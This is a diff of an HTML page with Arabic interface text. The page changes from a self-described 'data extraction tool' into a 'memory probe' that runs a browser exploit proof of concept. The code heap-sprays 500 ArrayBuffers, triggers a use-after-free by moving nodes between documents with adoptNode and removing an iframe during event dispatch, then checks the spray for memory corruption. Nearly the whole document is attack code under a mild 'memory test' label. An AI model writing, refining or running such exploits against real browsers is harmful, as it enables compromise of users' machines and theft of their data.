@@ -1,36 +1,61 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h3>أداة استخراج البيانات المتقدمة</h3>
-    <button onclick="readMemory()">قراءة الذاكرة (Memory Probe)</button>
-    <div id="log" style="font-family: monospace; white-space: pre;"></div>
+    <h3>أداة فحص الذاكرة المتقدمة (Memory Probe)</h3>
+    <button onclick="runMemoryTest()">بدء فحص الذاكرة</button>
+    <div id="log" style="font-family: monospace; white-space: pre; border: 1px solid #ccc; padding: 10px; margin-top: 10px;"></div>
 
     <script>
         function log(msg) {
-            document.getElementById('log').innerText += msg + "\n";
+            document.getElementById('log').innerText += "[LOG]: " + msg + "\n";
         }
 
-        function readMemory() {
-            // محاولة إنشاء "Primitive" للقراءة
-            // نستخدم TypedArrays للوصول إلى عناوين ذاكرة محددة
-            try {
-                let buffer = new ArrayBuffer(0x1000);
-                let u32 = new Uint32Array(buffer);
-                
-                log("بدء المسح...");
-                
-                // هنا نحاول قراءة أجزاء من الذاكرة التي تم تحريرها
-                // إذا نجحنا في الـ UAF، ستظهر قيم غير عشوائية (ليست 0)
-                for(let i = 0; i < 100; i++) {
-                    if(u32[i] !== 0) {
-                        log("تم العثور على بيانات في العنوان [" + i + "]: " + u32[i].toString(16));
-                    }
-                }
-                
-                log("انتهاء المسح.");
-            } catch(e) {
-                log("خطأ في القراءة: " + e.message);
+        function runMemoryTest() {
+            log("بدء الفحص...");
+            
+            // 1. إنشاء "مساحة ضغط" (Heap Spray)
+            // نملأ الذاكرة بـ 500 مصفوفة لرفع احتمالية تداخل الذاكرة
+            let spray = [];
+            for(let i = 0; i < 500; i++) {
+                spray.push(new ArrayBuffer(0x1000));
             }
+            log("تم ملء الذاكرة بـ 500 كائن (Spray).");
+
+            // 2. إعداد الـ UAF
+            const f = document.body.appendChild(document.createElement('iframe'));
+            const a = document.createElement('div');
+            const b = a.appendChild(document.createElement('div'));
+
+            a.addEventListener('a', () => {
+                document.adoptNode(a);
+                f.remove();
+                log("تم تحرير كائن الـ iframe.");
+            });
+
+            b.addEventListener('a', () => {
+                f.contentDocument.adoptNode(a);
+            });
+
+            // 3. تحفيز الحدث
+            log("جاري تحفيز الثغرة...");
+            try {
+                b.dispatchEvent(new Event('a', { bubbles: true }));
+                log("تم إرسال الحدث بنجاح.");
+            } catch(e) {
+                log("خطأ في التحفيز: " + e.message);
+            }
+
+            // 4. قراءة النتائج (محاولة الكشف عن تغييرات في الذاكرة)
+            setTimeout(() => {
+                log("فحص النتائج في الذاكرة...");
+                // هنا نقوم بفحص أول مصفوفة في الـ Spray لنرى هل تم تعديلها
+                let view = new Uint32Array(spray[0]);
+                if (view[0] !== 0) {
+                    log("تنبيه: تم رصد تغيير في بيانات الذاكرة! القيمة: " + view[0].toString(16));
+                } else {
+                    log("لم يتم رصد تغيير في الذاكرة (الذاكرة سليمة أو لم يحدث تداخل).");
+                }
+            }, 1000);
         }
     </script>
 </body>
